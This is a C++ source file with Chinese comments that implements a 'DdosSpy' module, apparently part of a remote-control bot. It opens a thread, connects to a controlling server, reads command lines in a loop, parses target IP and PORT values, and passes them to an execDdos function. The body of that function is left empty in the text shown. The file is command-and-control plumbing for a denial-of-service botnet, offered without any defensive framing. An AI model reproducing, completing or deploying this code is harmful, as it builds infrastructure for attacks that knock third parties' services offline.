#include "ddosspy.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gds;
// 初始化类
static DdosSpy dSpy;

DdosSpy::DdosSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gds);
}

DdosSpy::~DdosSpy()
{
    // 删除互挤体
    DeleteCriticalSection(&gds);
}

void DdosSpy::startByNewThread(std::string domain, int port)
{
    // 将域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0, DdosSpy::threadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD DdosSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));

    // 开始DDOS
    startDdosSpy(domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void DdosSpy::startDdosSpy(std::string domain, int port)
{
    // 创建socket并连接至服务端
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server " <<
                     domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始监控消息
    std::cout << "Started ddos atk" << std::endl;
    std::fflush(stdout);

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;

    while (1) {
        ret = sock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

       // 把数据加入到缓冲区
       addDataToBuffer(&sock, buf, szData, ret);
    }

    // 完成
    std::cout << "Finished cmd spy" << std::endl;
    std::fflush(stdout);
}

void DdosSpy::addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size)
{
    buf.append(data,size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = buf.find(dSpy.DdosEnd)) >= 0) {
        std::string line = buf.substr(0,endIndex);
        buf.erase(0, endIndex+dSpy.DdosEnd.length());

        // 处理指令
        std::map<std::string, std::string> ddosargs = dSpy.parseArgs(line);

        execDdos(ddosargs["IP"].data(),atoi(ddosargs["PORT"].data()));
    }
}

std::map<std::string, std::string> DdosSpy::parseArgs(std::string &data)
{
    // 字符串分割成列表
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(DdosSplit);
    pos1 = 0;
    while(std::string::npos != pos2) {
        v.push_back(data.substr(pos1, pos2-pos1));
        pos1 = pos2 + DdosSplit.size();
        pos2 = data.find(DdosSplit, pos1);
    }
    if(pos1 != data.length()) v.push_back(data.substr(pos1));

    // 解析参数
    std::map<std::string, std::string> args;
    for (int i=0; i<(int)v.size()-1; i+=2) {
        args[v.at(i)] =  v.at(i+1);
    }

    return args;
}

void DdosSpy::execDdos(std::string atkip, int atkport)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gds);


    // 解除函数锁定
    LeaveCriticalSection(&gds);
}
